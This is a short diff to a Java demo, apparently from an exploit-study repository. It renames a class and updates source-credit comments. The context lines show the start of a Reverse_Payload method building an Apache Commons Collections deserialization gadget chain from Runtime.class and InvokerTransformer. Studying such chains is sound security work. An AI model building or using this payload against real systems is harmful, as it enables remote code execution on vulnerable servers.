@@ -1,4 +1,5 @@
 package ApacheCommonsCollections;
+
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -15,13 +16,12 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.TransformedMap;
-
 /*
- * code from https://paper.seebug.org/312/
- * 未成功弹窗，不知为什么
+ * this code from https://github.com/shengqi158
+ * 见image.png
  */
 
-public class test3 {
+public class shenqi158demo {
     public static Object Reverse_Payload() throws Exception {
         Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
